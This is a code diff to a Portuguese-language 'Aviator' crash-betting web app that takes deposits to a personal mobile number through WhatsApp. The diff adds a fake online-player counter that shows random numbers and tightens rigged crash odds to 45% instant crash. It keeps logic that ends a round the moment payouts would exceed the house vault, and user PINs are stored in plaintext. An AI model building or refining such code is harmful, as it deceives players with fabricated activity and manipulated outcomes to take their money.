@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator Probetgames - Admin Edition</title>
+    <title>Aviator Probetgames</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #0b0b0b; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
@@ -24,19 +24,19 @@
 <body>
 
 <div id="auth-screen" class="fixed inset-0 bg-black z-50 flex flex-col items-center justify-center p-6">
-    <h1 class="text-red-600 text-3xl font-black mb-8 select-none">AVIADOR PROBETGAMES</h1>
+    <h1 class="text-red-600 text-3xl font-black mb-8 select-none tracking-tighter">AVIADOR PROBETGAMES</h1>
     <div class="w-full max-w-sm bg-gray-900 p-6 rounded-3xl border border-gray-800">
-        <input type="text" id="phone" placeholder="Contacto (+258...)" class="w-full p-4 mb-3 bg-black border border-gray-700 rounded-xl text-white">
-        <input type="password" id="pin" placeholder="PIN de 6 dígitos" class="w-full p-4 mb-6 bg-black border border-gray-700 rounded-xl text-white">
-        <button onclick="userAction.login()" class="w-full bg-green-600 py-4 rounded-xl font-bold mb-3">ENTRAR</button>
-        <button onclick="userAction.register()" class="w-full bg-gray-800 py-4 rounded-xl font-bold">CRIAR CONTA</button>
+        <input type="text" id="phone" placeholder="Contacto (+258...)" class="w-full p-4 mb-3 bg-black border border-gray-700 rounded-xl text-white outline-none focus:border-red-600 transition-all">
+        <input type="password" id="pin" placeholder="PIN de 6 dígitos" class="w-full p-4 mb-6 bg-black border border-gray-700 rounded-xl text-white outline-none focus:border-red-600 transition-all">
+        <button onclick="userAction.login()" class="w-full bg-green-600 hover:bg-green-500 py-4 rounded-xl font-bold mb-3 transition-colors">ENTRAR</button>
+        <button onclick="userAction.register()" class="w-full bg-gray-800 hover:bg-gray-700 py-4 rounded-xl font-bold transition-colors">CRIAR CONTA</button>
     </div>
 </div>
 
 <div id="game-screen" class="p-4 hidden">
     <div class="flex justify-between items-start mb-4">
         <div>
-            <p id="player-id" class="text-gray-500 text-xs uppercase font-bold">---</p>
+            <p id="player-id" class="text-gray-500 text-xs uppercase font-bold tracking-widest">---</p>
             <p class="text-green-500 text-[10px] font-bold">● <span id="online-count">1248</span> ONLINE</p>
         </div>
         <div class="text-right">
@@ -52,7 +52,7 @@
 
     <div class="bg-black aspect-video rounded-[2rem] flex flex-col items-center justify-center border-2 border-gray-800 relative mb-4 overflow-hidden">
         <div id="mult-display" class="multiplier-text">1.00x</div>
-        <div id="game-info" class="text-gray-500 font-bold uppercase tracking-widest text-xs mt-2">Aguardando...</div>
+        <div id="game-info" class="text-gray-500 font-bold uppercase tracking-widest text-[10px] mt-2">Aguardando...</div>
         <div class="w-48 progress-container hidden" id="waiting-timer">
             <div id="progress-bar"></div>
         </div>
@@ -61,12 +61,12 @@
     <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
         <div class="bg-gray-900 p-4 rounded-3xl border border-gray-800">
             <input type="number" id="bet-val-1" value="10" class="w-full bg-black text-center p-2 rounded-lg mb-2 text-white font-bold border border-gray-700">
-            <button id="btn-bet-1" onclick="gameEngine.placeBet(1)" class="w-full py-5 rounded-2xl btn-apostar font-black text-lg uppercase transition-all">Apostar</button>
+            <button id="btn-bet-1" onclick="gameEngine.placeBet(1)" class="w-full py-5 rounded-2xl btn-apostar font-black text-lg uppercase transition-all shadow-lg">Apostar</button>
             <div id="cashout-val-1" class="text-center text-[10px] mt-2 text-gray-500 font-bold">GANHOS: 0.00</div>
         </div>
         <div class="bg-gray-900 p-4 rounded-3xl border border-gray-800">
             <input type="number" id="bet-val-2" value="10" class="w-full bg-black text-center p-2 rounded-lg mb-2 text-white font-bold border border-gray-700">
-            <button id="btn-bet-2" onclick="gameEngine.placeBet(2)" class="w-full py-5 rounded-2xl btn-apostar font-black text-lg uppercase transition-all">Apostar</button>
+            <button id="btn-bet-2" onclick="gameEngine.placeBet(2)" class="w-full py-5 rounded-2xl btn-apostar font-black text-lg uppercase transition-all shadow-lg">Apostar</button>
             <div id="cashout-val-2" class="text-center text-[10px] mt-2 text-gray-500 font-bold">GANHOS: 0.00</div>
         </div>
     </div>
@@ -100,6 +100,15 @@
         2: { active: false, amount: 0, waiting: false }
     };
 
+    // --- FUNÇÃO DE JOGADORES ONLINE DINÂMICOS ---
+    function updateOnlineCount() {
+        const base = 1200;
+        const variation = Math.floor(Math.random() * 150);
+        document.getElementById('online-count').innerText = base + variation;
+    }
+    setInterval(updateOnlineCount, 3000);
+    updateOnlineCount();
+
     onValue(ref(db, 'Config/Cofre'), (snap) => {
         cofreDisponivel = snap.val() || 5000;
     });
@@ -119,9 +128,9 @@
             const pin = document.getElementById('pin').value;
             if(!phone || pin.length < 4) return alert("Preencha todos os campos corretamente.");
             
-            // REDUZIDO PARA 5 MTN
+            // BÓNUS DE 5 MTN
             await set(ref(db, 'User/' + phone), { Contacto: phone, PIN: pin, Saldo: 5, Bonus: 0 });
-            alert("Conta criada com sucesso! Ganhou 5 MTN de bônus.");
+            alert("Conta criada! Recebeu 5 MTN de bónus.");
         }
     };
 
@@ -139,7 +148,7 @@
             window.gameEngine.waitNextRound();
         },
         deposit: () => {
-            const msg = "DEPÓSITO\n\n1. Envie o valor para o número: 860407269\n2. Envie o comprovativo via WhatsApp.";
+            const msg = "DEPÓSITO\n\nEnvie o valor para: 860407269\nEnvie comprovativo via WhatsApp.";
             if(confirm(msg)) {
                 window.open(`https://wa.me/258860407269?text=Depósito: ${userData.Contacto}`, '_blank');
             }
@@ -156,8 +165,8 @@
                     data: new Date().toLocaleString(),
                     status: "Pendente"
                 });
-                alert("Pedido de levantamento enviado!");
-            } else { alert("Saldo insuficiente ou valor abaixo do mínimo."); }
+                alert("Pedido enviado para análise!");
+            } else { alert("Saldo insuficiente."); }
         },
         updateHistory: (odd) => {
             const container = document.getElementById('history');
@@ -203,7 +212,7 @@
             });
 
             flightInterval = setInterval(() => {
-                currentMult += 0.01 + (currentMult * 0.005); // Voo um pouco mais rápido para aumentar tensão
+                currentMult += 0.01 + (currentMult * 0.006); 
                 document.getElementById('mult-display').innerText = currentMult.toFixed(2) + "x";
 
                 let riscoTotal = 0;
@@ -211,7 +220,7 @@
                     if(bets[id].active) riscoTotal += (bets[id].amount * currentMult);
                 });
 
-                // Se o prêmio total a pagar exceder o cofre, explode na hora
+                // PROTEÇÃO RADICAL DA CASA
                 if(riscoTotal > cofreDisponivel || currentMult >= crashPoint) {
                     window.gameEngine.crash(currentMult);
                 }
@@ -274,10 +283,10 @@
         },
         calcOdds: () => {
             const r = Math.random() * 100;
-            // DIFICULDADE AUMENTADA:
-            if(r < 40) return 1.00;             // 40% de chance de Crash Instantâneo
-            if(r < 90) return (Math.random() * 0.7 + 1.1); // 50% de chance de Crash baixo (até 1.8x)
-            return (Math.random() * 3 + 2);     // Apenas 10% de chance de passar de 2x
+            // PROBABILIDADES RIGOROSAS
+            if(r < 45) return 1.00;             // 45% Instant Crash
+            if(r < 92) return (Math.random() * 0.5 + 1.1); // 47% de Crash muito baixo (1.1x a 1.6x)
+            return (Math.random() * 2 + 1.8);    // Apenas 8% de chance de chegar perto de 3x
         }
     };
 </script>
